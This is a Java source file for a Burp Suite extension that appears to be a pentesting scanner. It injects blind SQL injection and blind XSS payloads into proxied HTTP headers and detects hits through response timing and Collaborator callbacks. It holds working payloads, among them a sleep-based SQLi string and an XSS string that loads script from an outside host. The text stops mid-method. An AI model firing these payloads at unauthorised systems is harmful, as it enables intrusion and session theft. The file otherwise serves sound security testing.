package slicingmelon.burpheaderbanger;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.CollaboratorServer;
import burp.api.montoya.collaborator.DnsDetails;
import burp.api.montoya.collaborator.HttpDetails;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.SecretKey;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.proxy.http.InterceptedRequest;
import burp.api.montoya.proxy.http.InterceptedResponse;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;
import burp.api.montoya.proxy.http.ProxyResponseHandler;
import burp.api.montoya.proxy.http.ProxyResponseReceivedAction;
import burp.api.montoya.proxy.http.ProxyResponseToBeSentAction;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.scancheck.ActiveScanCheck;
import burp.api.montoya.scanner.scancheck.PassiveScanCheck;
import burp.api.montoya.scanner.scancheck.ScanCheckType;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.http.Http;

import static burp.api.montoya.scanner.AuditResult.auditResult;
import static burp.api.montoya.scanner.ConsolidationAction.KEEP_EXISTING;
import static java.util.Collections.emptyList;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.*;
import java.awt.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, ProxyResponseHandler, 
        ActiveScanCheck, PassiveScanCheck, ContextMenuItemsProvider {

    private static final String VERSION = "0.0.1";
    private static final int MAX_DICTIONARY_SIZE = 5000;
    private static final int DEFAULT_SQLI_SLEEP_TIME = 17;
    
    private static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/png", "image/jpeg", "image/jpg", "image/gif",
            "video/webm", "video/mp4", "text/event-stream",
            "application/octet-stream", "font/woff", "font/woff2"
    );

    private MontoyaApi api;
    private PersistedObject persistedObject;
    private CollaboratorClient collaboratorClient;
    private ScheduledExecutorService scheduler;
    private String collaboratorServerLocation;

    
    // Settings
    private boolean extensionActive = true;
    private boolean onlyInScopeItems = false;
    private int attackMode = 2; // 1 = Blind SQLi, 2 = Blind XSS
    private int sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
    
    // Headers and payloads
    private List<String> headers = new ArrayList<>();
    private List<String> sensitiveHeaders = new ArrayList<>();
    private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
    private String bxssPayload = "Mozilla\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
    private List<String> skipHosts = new ArrayList<>();
    private List<String> injectedHeaders = new ArrayList<>();
    private List<String> extraHeaders = new ArrayList<>();
    private boolean overwriteExtraHeaders = true; // true = overwrite, false = add only if not exists
    
    // UI Components
    private HeaderBangerTab headerBangerTab;
    
    // Request timing tracking
    private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
    
    // Efficient payload correlation tracking
    private final Map<String, PayloadCorrelation> payloadMap = new ConcurrentHashMap<>();

    private static class PayloadCorrelation {
        final String requestUrl;
        final String headerName;
        final String requestMethod;
        final long timestamp;

        PayloadCorrelation(String requestUrl, String headerName, String requestMethod) {
            this.requestUrl = requestUrl;
            this.headerName = headerName;
            this.requestMethod = requestMethod;
            this.timestamp = System.currentTimeMillis();
        }
    }
    
    // Default headers
    private static final List<String> DEFAULT_HEADERS = Arrays.asList(
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "Forwarded",
            "True-Client-IP",
            "X-Client-IP",
            "X-Cluster-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "Fastly-Client-IP"
    );
    
    private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
            "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
            "X-HTTP-Host-Override", "Forwarded", "Origin",
            "X-Original-URL", "X-Rewrite-URL"
    );
    
    private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
            "player.vimeo.com", "example3.com"
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.persistedObject = api.persistence().extensionData();
        
        // Initialize collaborator client with secret key
        initializeCollaboratorClient();
        
        this.scheduler = Executors.newScheduledThreadPool(2);
        
        // Set extension name
        api.extension().setName("Header Banger");
        
        // Load settings
        loadSettings();
        
        // Initialize collaborator payload
        // initializeCollaboratorPayload(); // This is no longer needed as we generate payloads on the fly
        
        // Update injected headers
        updateInjectedHeaders();
        
        // Register handlers
        api.proxy().registerRequestHandler(this);
        api.proxy().registerResponseHandler(this);
        api.scanner().registerActiveScanCheck(this, ScanCheckType.PER_REQUEST);
        api.scanner().registerPassiveScanCheck(this, ScanCheckType.PER_REQUEST);
        api.userInterface().registerContextMenuItemsProvider(this);
        
        // Create and register UI
        headerBangerTab = new HeaderBangerTab(this, api);
        api.userInterface().registerSuiteTab("Header Banger", headerBangerTab.getTabbedPane());
        
        // Start collaborator polling
        startCollaboratorPolling();
        
        api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
    }

    private void initializeCollaboratorClient() {
        try {
            // Get existing secret key from persistence
            String existingCollaboratorKey = persistedObject.getString("collaboratorSecretKey");
            
            if (existingCollaboratorKey != null && !existingCollaboratorKey.isEmpty()) {
                try {
                    api.logging().logToOutput("Creating Collaborator client from existing key");
                    this.collaboratorClient = api.collaborator().restoreClient(SecretKey.secretKey(existingCollaboratorKey));
                } catch (Exception e) {
                    api.logging().logToOutput("Failed to restore collaborator client, creating new one: " + e.getMessage());
                    this.collaboratorClient = api.collaborator().createClient();
                    persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
                }
            } else {
                api.logging().logToOutput("No previously found Collaborator client. Creating new client...");
                this.collaboratorClient = api.collaborator().createClient();
                
                // Save the secret key of the CollaboratorClient so that you can retrieve it later
                api.logging().logToOutput("Saving Collaborator secret key");
                persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
            }
            
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
            api.logging().logToOutput("Collaborator client initialized successfully");
        } catch (Exception e) {
            api.logging().logToError("Failed to initialize collaborator client: " + e.getMessage());
            // Fallback to creating a new client
            this.collaboratorClient = api.collaborator().createClient();
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
        }
    }
    


    private void loadSettings() {
        // Load extension active state
        if (persistedObject.getBoolean("extensionActive") != null) {
            extensionActive = persistedObject.getBoolean("extensionActive");
        }
        
        // Load only in scope setting
        if (persistedObject.getBoolean("onlyInScopeItems") != null) {
            onlyInScopeItems = persistedObject.getBoolean("onlyInScopeItems");
        }
        
        // Load attack mode
        if (persistedObject.getInteger("attackMode") != null) {
            attackMode = persistedObject.getInteger("attackMode");
        }
        
        // Load headers
        String headersJson = persistedObject.getString("headers");
        if (headersJson != null && !headersJson.isEmpty()) {
            headers = new ArrayList<>(Arrays.asList(headersJson.split(",")));
        } else {
            headers = new ArrayList<>(DEFAULT_HEADERS);
        }
        
        // Load sensitive headers
        String sensitiveHeadersJson = persistedObject.getString("sensitiveHeaders");
        if (sensitiveHeadersJson != null && !sensitiveHeadersJson.isEmpty()) {
            sensitiveHeaders = new ArrayList<>(Arrays.asList(sensitiveHeadersJson.split(",")));
        } else {
            sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
        }
        
        // Load skip hosts
        String skipHostsJson = persistedObject.getString("skipHosts");
        if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
            skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
        } else {
            skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
        }
        
        // Load payloads
        String savedSqliPayload = persistedObject.getString("sqliPayload");
        if (savedSqliPayload != null) {
            sqliPayload = savedSqliPayload;
        }
        
        String savedBxssPayload = persistedObject.getString("bxssPayload");
        if (savedBxssPayload != null) {
            bxssPayload = savedBxssPayload;
        }
        
        // Load extra headers
        String extraHeadersJson = persistedObject.getString("extraHeaders");
        if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
            extraHeaders = new ArrayList<>(Arrays.asList(extraHeadersJson.split(",")));
        }
        
        // Load overwrite setting
        if (persistedObject.getBoolean("overwriteExtraHeaders") != null) {
            overwriteExtraHeaders = persistedObject.getBoolean("overwriteExtraHeaders");
        }
        
        // Extract sleep time from SQLi payload
        extractSqliSleepTime();
    }

    public void saveSettings() {
        persistedObject.setBoolean("extensionActive", extensionActive);
        persistedObject.setBoolean("onlyInScopeItems", onlyInScopeItems);
        persistedObject.setInteger("attackMode", attackMode);
        persistedObject.setString("headers", String.join(",", headers));
        persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
        persistedObject.setString("skipHosts", String.join(",", skipHosts));
        persistedObject.setString("sqliPayload", sqliPayload);
        persistedObject.setString("bxssPayload", bxssPayload);
        persistedObject.setString("extraHeaders", String.join(",", extraHeaders));
        persistedObject.setBoolean("overwriteExtraHeaders", overwriteExtraHeaders);
    }

    // Getter and setter methods for UI access
    public boolean isExtensionActive() { return extensionActive; }
    public void setExtensionActive(boolean active) { this.extensionActive = active; }
    
    public boolean isOnlyInScopeItems() { return onlyInScopeItems; }
    public void setOnlyInScopeItems(boolean onlyInScope) { this.onlyInScopeItems = onlyInScope; }
    
    public boolean isOverwriteExtraHeaders() { return overwriteExtraHeaders; }
    public void setOverwriteExtraHeaders(boolean overwrite) { this.overwriteExtraHeaders = overwrite; }
    
    public int getAttackMode() { return attackMode; }
    public void setAttackMode(int mode) { this.attackMode = mode; }

    // Remove old UI creation methods - they're now in HeaderBangerTab.java
    
    public List<String> getHeaders() { return headers; }
    public List<String> getSensitiveHeaders() { return sensitiveHeaders; }
    public List<String> getExtraHeaders() { return extraHeaders; }
    public List<String> getSkipHosts() { return skipHosts; }
    
    public String getSqliPayload() { return sqliPayload; }
    public void setSqliPayload(String payload) { this.sqliPayload = payload; }
    
    public String getBxssPayload() { return bxssPayload; }
    public void setBxssPayload(String payload) { this.bxssPayload = payload; }
    
    public CollaboratorClient getCollaboratorClient() { return collaboratorClient; }
    
    public List<String> getDefaultHeaders() { return new ArrayList<>(DEFAULT_HEADERS); }
    public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }

    private void initializeCollaboratorPayload() {
        // This method is no longer needed as we generate payloads dynamically.
        // It's kept here to avoid breaking old references, but it's empty.
    }

    public void extractSqliSleepTime() {
        Pattern pattern = Pattern.compile("sleep\\((\\d+)\\)", Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(sqliPayload);
        if (matcher.find()) {
            sqliSleepTime = Integer.parseInt(matcher.group(1));
        }
    }

    public void updateInjectedHeaders() {
        injectedHeaders.clear();
        String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
        
        for (String header : headers) {
            if ("Referer".equals(header)) {
                continue; // Handle Referer separately
            }
            
            if ("User-Agent".equals(header)) {
                if (attackMode == 1) {
                    // For SQLi, keep the Mozilla prefix
                    injectedHeaders.add("User-Agent: Mozilla/5.0" + currentPayload);
                } else {
                    // For XSS, just use the payload directly
                    injectedHeaders.add("User-Agent: " + currentPayload);
                }
            } else {
                injectedHeaders.add(header + ": 1" + currentPayload);
            }
        }
        
        // Note: Extra headers are NOT added here - they should be added separately 
        // without any payload injection in the request modification methods
    }

    private void startCollaboratorPolling() {
        api.logging().logToOutput("Starting collaborator polling every 10 seconds...");
        
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                api.logging().logToOutput("Polling collaborator for interactions...");
                
                List<Interaction> interactions = collaboratorClient.getAllInteractions();
                
                api.logging().logToOutput("Collaborator polling: Found " + interactions.size() + " interactions");
                api.logging().logToOutput("Current payload map size: " + payloadMap.size());
                
                if (payloadMap.size() > 0) {
                    api.logging().logToOutput("Payload map contents: " + payloadMap.keySet());
                }
                
                for (Interaction interaction : interactions) {
                    api.logging().logToOutput("Processing interaction: " + interaction.id().toString());
                    
                    String interactionDomain = findDomainInInteraction(interaction);
                    if (interactionDomain != null) {
                        PayloadCorrelation correlation = payloadMap.get(interactionDomain);
                        if (correlation != null) {
                            api.logging().logToOutput("SUCCESSFUL XSS DETECTED!");
                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                            
                            // Log detailed interaction information
                            api.logging().logToOutput("Interaction Details:");
                            api.logging().logToOutput("  • URL: " + correlation.requestUrl);
                            api.logging().logToOutput("  • Method: " + correlation.requestMethod);
                            api.logging().logToOutput("  • Header: " + correlation.headerName);
                            api.logging().logToOutput("  • Time: " + new java.util.Date());
                            
                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                            
                            // Create XSS issue using proxy history
                            createXssIssueFromProxyHistory(interaction, correlation);
                            
                            // Clean up the map
                            payloadMap.remove(interactionDomain);
                        } else {
                            api.logging().logToOutput("Found interaction domain but no correlation: " + interactionDomain);
                        }
                    } else {
                        api.logging().logToOutput("No matching domain found for interaction: " + interaction.id().toString());
                    }
                }
                
                api.logging().logToOutput("Collaborator polling completed.");
            } catch (Exception e) {
                api.logging().logToError("Error polling collaborator: " + e.getMessage());
                e.printStackTrace();
            }
        }, 10, 10, TimeUnit.SECONDS);  // Changed from 30 to 10 seconds

        // Add a cleanup task for old payloads in the map
        scheduler.scheduleWithFixedDelay(() -> {
            long now = System.currentTimeMillis();
            int removedCount = 0;
            Iterator<Map.Entry<String, PayloadCorrelation>> iterator = payloadMap.entrySet().iterator();
            while (iterator.hasNext()) {
                Map.Entry<String, PayloadCorrelation> entry = iterator.next();
                if ((now - entry.getValue().timestamp) > TimeUnit.MINUTES.toMillis(15)) {
                    iterator.remove();
                    removedCount++;
                }
            }
            if (removedCount > 0) {
                api.logging().logToOutput("Cleaned up " + removedCount + " old payloads from map");
            }
        }, 15, 15, TimeUnit.MINUTES);
    }

    private String findDomainInInteraction(Interaction interaction) {
        String interactionId = interaction.id().toString();
        
        // First, try to directly match the interaction ID with our payload map keys
        if (payloadMap.containsKey(interactionId)) {
            return interactionId;
        }
        
        // If that doesn't work, check if the interaction ID is a subdomain of any of our stored payloads
        for (String payloadDomain : payloadMap.keySet()) {
            if (interactionId.equals(payloadDomain)) {
                return payloadDomain;
            }
        }
        
        // For HTTP interactions, check if the interaction ID contains our collaborator domain
        if (interaction.httpDetails().isPresent()) {
            String collaboratorHost = this.collaboratorServerLocation;
            if (interactionId.endsWith("." + collaboratorHost)) {
                // Check if this matches any of our stored payloads
                for (String payloadDomain : payloadMap.keySet()) {
                    if (payloadDomain.equals(interactionId)) {
                        return payloadDomain;
                    }
                }
            }
        }
        
        // For DNS interactions, check the query
        if (interaction.dnsDetails().isPresent()) {
            String dnsQuery = interaction.dnsDetails().get().query().toString();
            // Remove trailing dot if present
            if (dnsQuery.endsWith(".")) {
                dnsQuery = dnsQuery.substring(0, dnsQuery.length() - 1);
            }
            
            // Check if this matches any of our stored payloads
            for (String payloadDomain : payloadMap.keySet()) {
                if (payloadDomain.equals(dnsQuery)) {
                    return payloadDomain;
                }
            }
        }
        
        // Debug logging
        api.logging().logToOutput("No matching payload found for interaction ID: " + interactionId);
        api.logging().logToOutput("Available payload domains: " + payloadMap.keySet());
        
        return null;
    }

    private void createXssIssueFromProxyHistory(Interaction interaction, PayloadCorrelation correlation) {
        api.logging().logToOutput("XSS VULNERABILITY CONFIRMED!");
        api.logging().logToOutput("Attack Vector: Header injection via " + correlation.headerName);
        api.logging().logToOutput("  • URL: " + correlation.requestUrl);
        api.logging().logToOutput("  • Method: " + correlation.requestMethod);
        api.logging().logToOutput("Impact: Cross-Site Scripting (XSS) execution detected");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        api.logging().logToOutput("Interaction ID: " + interaction.id());
        
        // Find the original request from proxy history using interaction ID
        String interactionId = interaction.id().toString();
        List<burp.api.montoya.proxy.ProxyHttpRequestResponse> proxyHistory = api.proxy().history(
            requestResponse -> requestResponse.finalRequest().toString().contains(interactionId)
        );
        
        if (!proxyHistory.isEmpty()) {
            // Use the first matching request from proxy history
            burp.api.montoya.proxy.ProxyHttpRequestResponse originalRequestResponse = proxyHistory.get(0);
            
            try {
                // Create audit issue using the original request/response from proxy history
                AuditIssue issue = AuditIssue.auditIssue(
                    "Header Injection XSS via " + correlation.headerName,
                    "Cross-Site Scripting (XSS) vulnerability detected through header injection in the " 
                    + correlation.headerName + " header. The payload was successfully executed as confirmed by "
                    + "collaborator interaction " + interaction.id() + ". This allows attackers to inject arbitrary "
                    + "JavaScript code that will be executed in the context of other users' browsers.",
                    "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                    + "Implement proper output encoding when reflecting user-controlled data in responses.",
                    originalRequestResponse.finalRequest().url(),
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.CERTAIN,
                    "This vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, "
                    + "potentially leading to session hijacking, defacement, or other malicious activities.",
                    "The application reflects user-controlled header values without proper validation or encoding, "
                    + "allowing XSS attacks through HTTP header injection.",
                    AuditIssueSeverity.HIGH,
                    HttpRequestResponse.httpRequestResponse(originalRequestResponse.finalRequest(), originalRequestResponse.originalResponse())
                );
                
                api.siteMap().add(issue);
                api.logging().logToOutput("Audit issue created successfully: Header Injection XSS via " + correlation.headerName);
            } catch (Exception e) {
                api.logging().logToError("Failed to create audit issue: " + e.getMessage());
            }
        } else {
            api.logging().logToOutput("Could not find original request in proxy history for interaction: " + interactionId);
            
            // Fallback to the old method if proxy history doesn't contain the request
            try {
                HttpRequest issueRequest = HttpRequest.httpRequestFromUrl(correlation.requestUrl);
                HttpRequestResponse issueRequestResponse = api.http().sendRequest(issueRequest);
                
                AuditIssue issue = AuditIssue.auditIssue(
                    "Header Injection XSS via " + correlation.headerName,
                    "Cross-Site Scripting (XSS) vulnerability detected through header injection in the " 
                    + correlation.headerName + " header. The payload was successfully executed as confirmed by "
                    + "collaborator interaction " + interaction.id() + ". This allows attackers to inject arbitrary "
                    + "JavaScript code that will be executed in the context of other users' browsers.",
                    "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                    + "Implement proper output encoding when reflecting user-controlled data in responses.",
                    correlation.requestUrl,
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.CERTAIN,
                    "This vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, "
                    + "potentially leading to session hijacking, defacement, or other malicious activities.",
                    "The application reflects user-controlled header values without proper validation or encoding, "
                    + "allowing XSS attacks through HTTP header injection.",
                    AuditIssueSeverity.HIGH,
                    issueRequestResponse
                );
                
                api.siteMap().add(issue);
                api.logging().logToOutput("Audit issue created successfully (fallback): Header Injection XSS via " + correlation.headerName);
            } catch (Exception e) {
                api.logging().logToError("Failed to create fallback audit issue: " + e.getMessage());
            }
        }
        
        api.logging().logToOutput("───────────────────────────────────────────────────────────");
    }

    private void createAuditIssue(String issueName, String issueDetail, String requestUrl, 
                                  AuditIssueSeverity severity, AuditIssueConfidence confidence) {
        try {
            // Create a simple HTTP request for the issue
            HttpRequest issueRequest = HttpRequest.httpRequestFromUrl(requestUrl);
            HttpRequestResponse issueRequestResponse = api.http().sendRequest(issueRequest);
            
            // Build the audit issue
            AuditIssue issue = AuditIssue.auditIssue(
                issueName,
                issueDetail,
                null, // remediation - can be null
                requestUrl,
                severity,
                confidence,
                null, // background - can be null
                null, // remediation background - can be null
                severity, // issue severity (not confidence)
                issueRequestResponse // evidence (request/response)
            );
            
            // Add the issue to Burp's issue list
            api.siteMap().add(issue);
            
            api.logging().logToOutput("Audit issue created successfully: " + issueName);
        } catch (Exception e) {
            api.logging().logToError("Failed to create audit issue: " + e.getMessage());
        }
    }
    
    private String getCurrentAttackHeaders() {
        StringBuilder attackHeaders = new StringBuilder();
        for (String header : headers) {
            if (attackHeaders.length() > 0) attackHeaders.append(", ");
            attackHeaders.append(header);
        }
        return attackHeaders.toString();
    }

    // Utility methods for header handling
    private List<HttpHeader> convertToHttpHeaders(List<String> headerStrings) {
        List<HttpHeader> httpHeaders = new ArrayList<>();
        for (String headerString : headerStrings) {
            String[] parts = headerString.split(":", 2);
            if (parts.length == 2) {
                httpHeaders.add(HttpHeader.httpHeader(parts[0].trim(), parts[1].trim()));
            }
        }
        return httpHeaders;
    }

    private String getHeaderValue(List<HttpHeader> headers, String headerName) {
        for (HttpHeader header : headers) {
            if (header.name().equalsIgnoreCase(headerName)) {
                return header.value();
            }
        }
        return null;
    }

    private List<HttpHeader> addOrReplaceHeaders(List<HttpHeader> originalHeaders, List<String> headersToAdd) {
        List<HttpHeader> newHeaders = new ArrayList<>();
        
        // Add original headers, excluding ones we're going to replace
        for (HttpHeader header : originalHeaders) {
            boolean shouldReplace = false;
            for (String headerToAdd : headersToAdd) {
                String[] parts = headerToAdd.split(":", 2);
                if (parts.length == 2 && parts[0].trim().equalsIgnoreCase(header.name())) {
                    shouldReplace = true;
                    break;
                }
            }
            if (!shouldReplace) {
                newHeaders.add(header);
            }
        }
        
        // Add new headers
        for (String headerToAdd : headersToAdd) {
            String[] parts = headerToAdd.split(":", 2);
            if (parts.length == 2) {
                String headerName = parts[0].trim();
                String headerValue = parts[1].trim();
                
                // Check if we should add or skip (if overwriteExtraHeaders is false)
                if (!overwriteExtraHeaders) {
                    boolean exists = originalHeaders.stream()
                            .anyMatch(h -> h.name().equalsIgnoreCase(headerName));
                    if (exists) {
                        continue; // Skip this header
                    }
                }
                
                newHeaders.add(HttpHeader.httpHeader(headerName, headerValue));
            }
        }
        
        return newHeaders;
    }

    // ProxyRequestHandler implementation
    @Override
    public ProxyRequestReceivedAction handleRequestReceived(InterceptedRequest interceptedRequest) {
        if (!extensionActive) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        HttpRequest request = interceptedRequest;
        
        // IMPORTANT: Skip modification for requests going to the collaborator server
        // This prevents interference with collaborator interactions
        if (collaboratorServerLocation != null && request.url().contains(collaboratorServerLocation)) {
            api.logging().logToOutput("Skipping collaborator request: " + request.url());
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }
        
        // Check if only processing in-scope items
        if (onlyInScopeItems && !api.scope().isInScope(request.url())) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        // Check if host should be skipped
        String host = request.httpService().host();
        if (skipHosts.contains(host)) {
            return ProxyRequestReceivedAction.continueWith(interceptedRequest);
        }

        // Modify request headers
        HttpRequest modifiedRequest = modifyRequestHeaders(request);
        
        // Store timestamp for response time analysis
        String requestKey = request.url();
        requestTimestamps.put(requestKey, System.currentTimeMillis());
        
        // Limit dictionary size
        if (requestTimestamps.size() > MAX_DICTIONARY_SIZE) {
            String oldestKey = requestTimestamps.entrySet().stream()
                    .min(Map.Entry.comparingByValue())
                    .map(Map.Entry::getKey)
                    .orElse(null);
            if (oldestKey != null) {
                requestTimestamps.remove(oldestKey);
            }
        }

        return ProxyRequestReceivedAction.continueWith(modifiedRequest);
    }

    @Override
    public ProxyRequestToBeSentAction handleRequestToBeSent(InterceptedRequest interceptedRequest) {
        return ProxyRequestToBeSentAction.continueWith(interceptedRequest);
    }

    // ProxyResponseHandler implementation
    @Override
    public ProxyResponseReceivedAction handleResponseReceived(InterceptedResponse interceptedResponse) {
        if (!extensionActive) { // No longer checking attackMode == 2 here
            return ProxyResponseReceivedAction.continueWith(interceptedResponse);
        }

        // Process response for SQL injection detection
        if (attackMode == 1) {
            processResponseForSqli(interceptedResponse);
        }
        
        // Launch separate scan for sensitive headers
        scheduler.execute(() -> processSensitiveHeadersScan(interceptedResponse));

        return ProxyResponseReceivedAction.continueWith(interceptedResponse);
    }

    @Override
    public ProxyResponseToBeSentAction handleResponseToBeSent(InterceptedResponse interceptedResponse) {
        return ProxyResponseToBeSentAction.continueWith(interceptedResponse);
    }

    private HttpRequest modifyRequestHeaders(HttpRequest request) {
        // For regular headers, inject both XSS and SQL injection payloads based on attack mode
        if (attackMode == 2) {
            return injectUniqueXssPayloads(request);
        } else {
            return injectSqlInjectionPayloads(request);
        }
    }

    private HttpRequest injectUniqueXssPayloads(HttpRequest request) {
        List<HttpHeader> modifiedHeaders = new ArrayList<>(request.headers());
        
        api.logging().logToOutput("Injecting XSS payloads for request: " + request.url());
        
        for (String headerName : headers) {
            CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
            String payloadDomain = collabPayload.toString();

            String finalPayload;
            if ("User-Agent".equalsIgnoreCase(headerName)) {
                finalPayload = bxssPayload.replace("{{collaborator}}", payloadDomain);
            } else if ("Referer".equalsIgnoreCase(headerName)) {
                String originalReferer = request.headerValue("Referer");
                if (originalReferer == null) originalReferer = request.url();
                finalPayload = originalReferer + bxssPayload.replace("{{collaborator}}", payloadDomain);
            } else {
                finalPayload = "1" + bxssPayload.replace("{{collaborator}}", payloadDomain);
            }

            // Create and store correlation
            PayloadCorrelation correlation = new PayloadCorrelation(request.url(), headerName, request.method());
            payloadMap.put(payloadDomain, correlation);
            
            api.logging().logToOutput("Added payload to map: " + payloadDomain + " -> " + headerName + " for " + request.url());

            // Overwrite header
            boolean headerFoundAndReplaced = false;
            for (int i = 0; i < modifiedHeaders.size(); i++) {
                if (modifiedHeaders.get(i).name().equalsIgnoreCase(headerName)) {
                    modifiedHeaders.set(i, HttpHeader.httpHeader(headerName, finalPayload));
                    headerFoundAndReplaced = true;
                    break;
                }
            }
            if (!headerFoundAndReplaced) {
                modifiedHeaders.add(HttpHeader.httpHeader(headerName, finalPayload));
            }
        }
        
        api.logging().logToOutput("Total payloads in map after injection: " + payloadMap.size());
        
        // Add extra headers as well, without payloads
        return request.withUpdatedHeaders(addOrReplaceHeaders(modifiedHeaders, extraHeaders));
    }
    
    private HttpRequest injectSqlInjectionPayloads(HttpRequest request) {
        List<HttpHeader> originalHeaders = request.headers();
        List<String> headersToAdd = new ArrayList<>();
        
        // Get base headers (exclude injected ones only)
        List<HttpHeader> baseHeaders = new ArrayList<>();
        for (HttpHeader header : originalHeaders) {
            if (!headers.contains(header.name())) {
                baseHeaders.add(header);
            }
        }

        // Handle Referer header separately
        String refererValue = getHeaderValue(originalHeaders, "Referer");
        
        // Add injected headers
        headersToAdd.addAll(injectedHeaders);
        
        // Add modified Referer if it was present
        if (refererValue != null && headers.contains("Referer")) {
            String currentPayload = sqliPayload;
            headersToAdd.add("Referer: " + refererValue + currentPayload);
        }
        
        // Add extra headers (clean, without payloads)
        headersToAdd.addAll(extraHeaders);

        List<HttpHeader> newHeaders = addOrReplaceHeaders(baseHeaders, headersToAdd);
        return request.withUpdatedHeaders(newHeaders);
    }

    private void processResponseForSqli(InterceptedResponse interceptedResponse) {
        // Check content type
        String contentType = getHeaderValue(interceptedResponse.headers(), "Content-Type");
        if (contentType != null) {
            String[] parts = contentType.split(";");
            if (parts.length > 0) {
                String mimeType = parts[0].trim().toLowerCase();
                if (SKIP_CONTENT_TYPES.contains(mimeType)) {
                    return;
                }
            }
        }

        // Check response time using the request URL from the intercepted response
        String requestKey = interceptedResponse.request().url();
        Long startTime = requestTimestamps.get(requestKey);
        if (startTime != null) {
            long responseTime = System.currentTimeMillis() - startTime;
            requestTimestamps.remove(requestKey);
            
            if (responseTime >= sqliSleepTime * 1000) {
                // Create SQL injection issue
                createSqlInjectionIssue(interceptedResponse, responseTime);
            }
        }
    }

    private void processSensitiveHeadersScan(InterceptedResponse interceptedResponse) {
        HttpRequest originalRequest = interceptedResponse.request();
        
        api.logging().logToOutput("Processing sensitive headers scan for: " + originalRequest.url());
        
        // Get host value
        String hostValue = getHeaderValue(originalRequest.headers(), "Host");
        if (hostValue == null) {
            api.logging().logToOutput("No Host header found, skipping sensitive headers scan");
            return;
        }

        if (attackMode == 2) {
            api.logging().logToOutput("Processing BXSS for sensitive headers");
            
            // BXSS logic for sensitive headers
            List<HttpHeader> modifiedHeaders = new ArrayList<>(originalRequest.headers());
            
            for (String sensitiveHeader : sensitiveHeaders) {
                CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
                String payloadDomain = collabPayload.toString();
                String finalPayload = hostValue + bxssPayload.replace("{{collaborator}}", payloadDomain);
                
                // Store correlation for this payload
                PayloadCorrelation correlation = new PayloadCorrelation(originalRequest.url(), sensitiveHeader, originalRequest.method());
                payloadMap.put(payloadDomain, correlation);
                
                api.logging().logToOutput("Added sensitive header payload to map: " + payloadDomain + " -> " + sensitiveHeader + " for " + originalRequest.url());
                
                // Add or replace the sensitive header
                boolean headerFoundAndReplaced = false;
                for (int i = 0; i < modifiedHeaders.size(); i++) {
                    if (modifiedHeaders.get(i).name().equalsIgnoreCase(sensitiveHeader)) {
